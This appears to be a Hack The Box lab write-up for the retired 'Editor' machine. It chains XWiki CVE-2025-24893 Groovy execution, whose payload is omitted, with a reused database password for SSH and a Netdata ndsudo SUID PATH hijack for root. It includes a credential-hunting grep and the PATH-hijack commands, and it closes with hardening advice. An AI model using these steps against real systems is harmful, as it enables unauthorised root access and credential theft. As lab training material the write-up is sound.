---
title: "CMS CVE-2025-24893 to Monitoring-Agent PATH Hijack"
description: "XWiki SolrSearch unauthenticated Groovy code execution (CVE-2025-24893) provides a foothold; reused database credentials enable SSH, and a SUID Netdata ndsudo helper is hijacked through PATH to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - xwiki
  - cve
  - path-hijack
---

## Summary

This Linux lab hosts XWiki behind an nginx reverse proxy. Enumeration identifies `<WIKI_HOST>`, running XWiki Debian 15.10.8, vulnerable to CVE-2025-24893 — an unauthenticated Groovy code execution flaw in the SolrSearch endpoint. The foothold exposes database credentials reused by a local SSH user. Privilege escalation abuses a SUID `ndsudo` helper from Netdata, whose PATH-based dependency resolution permits binary hijacking to obtain root.

## Context and Objective

The lab targets a Linux (Ubuntu) host with three open ports: SSH (22), nginx (80), and Jetty/XWiki (8080). An nginx virtual host configuration routes `<WIKI_HOST>` to the XWiki instance. The objective is to achieve user and root compromise through the identified attack surface.

Scope constraints:

- XWiki version 15.10.8 — vulnerable to CVE-2025-24893.
- Local user `<LOCAL_USER>` exists with reused XWiki database credentials.
- Netdata agent installed with SUID root helpers callable by the `netdata` group.

## Approach and Evidence

### Stage 1 — Service Discovery and Virtual Host Enumeration

An initial Rustscan identifies three open ports. Port 80 redirects to `<TARGET_HOST>`; port 8080 exposes XWiki directly via Jetty 10.0.20.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-TCP
```

```text
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
```

Virtual host fuzzing with Gobuster reveals a subdomain:

```bash
gobuster vhost \
  --url http://<TARGET_HOST> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain
```

```text
<WIKI_HOST> Status: 302 [Size: 0] [--> http://<WIKI_HOST>/xwiki]
```

Adding `<WIKI_HOST>` to `/etc/hosts` and browsing confirms XWiki Debian 15.10.8.

### Stage 2 — CVE-2025-24893: XWiki Groovy Code Execution

The XWiki SolrSearch endpoint is vulnerable to a template injection that can chain into Groovy execution. The technique closes the current XWiki syntax context, opens async and Groovy macros, then attempts command execution.

```text
Technique pattern: a SolrSearch text parameter contains syntax-context closure and async/Groovy macro invocation. Unsafe command and callback details omitted.
```

This technique can provide execution in the XWiki service context when the vulnerable endpoint is exposed.

### Stage 3 — Credential Discovery and User Escalation

Searching common configuration paths for credential patterns reveals plaintext database credentials:

```bash
grep -rn --include="*.xml" -i "password\|credential" /etc /var /opt 2>/dev/null
```

```text
/etc/xwiki/hibernate.cfg.xml:104:    <property name="hibernate.connection.password"><XWIKI_DB_PASSWORD></property>
```

The discovered password is reused by the local user `<LOCAL_USER>`, enabling SSH access:

```bash
ssh <LOCAL_USER>@<TARGET_HOST>
```

```text
<LOCAL_USER>@<TARGET_HOST>:~$
```

### Stage 4 — SUID Enumeration and Netdata PATH Hijack

Running SUID discovery identifies Netdata helpers installed with the SUID bit:

```bash
find / -perm -4000 2>/dev/null
```

```text
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

The user `<LOCAL_USER>` is a member of the `netdata` group, which grants access to these SUID binaries:

```bash
id
```

```text
uid=1000(<LOCAL_USER>) gid=1000(<LOCAL_USER>) groups=1000(<LOCAL_USER>),999(netdata)
```

`ndsudo` supports an `nvme-list` action that resolves the `nvme` binary through the caller-controlled `PATH`. By placing a custom `nvme` binary — a setuid root shell — in a controlled directory prepended to `PATH`, the SUID helper executes the attacker binary as root:

```bash
export PATH=/tmp/fakebin:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

```text
root@<TARGET_HOST>:/home/<LOCAL_USER>#
```

## Challenges and Decisions

- The initial `SolrSearch` technique requires careful XWiki syntax escaping before the async/Groovy macro pair can be invoked.
- Status validation required corroborating available retirement information before inclusion.

## Outcome

The machine demonstrates a complete attack chain: unauthenticated web RCE via CVE-2025-24893, credential reuse for local user escalation, and SUID binary PATH hijacking for root. Both user and root flags were obtained.

## Lessons and Recommendations

- **Patch XWiki promptly.** CVE-2025-24893 allows unauthenticated code execution; upgrade to a patched version and restrict access to macro-execution endpoints.
- **Avoid credential reuse across services.** Database passwords must not double as interactive user credentials. Use unique, scoped credentials stored with least privilege.
- **Audit SUID binaries for PATH safety.** SUID helpers must resolve dependencies by absolute path. PATH-based resolution in privileged binaries is a privilege escalation vector.
- **Restrict service group membership.** Membership in the `netdata` group grants interaction with privileged helpers. Group membership should follow least-privilege principles.

## References

- [CVE-2025-24893 — XWiki SolrSearch Groovy Code Execution](https://nvd.nist.gov/vuln/detail/CVE-2025-24893)
- Hack The Box retired Linux machine — [Editor](https://app.hackthebox.com/machines/Editor)
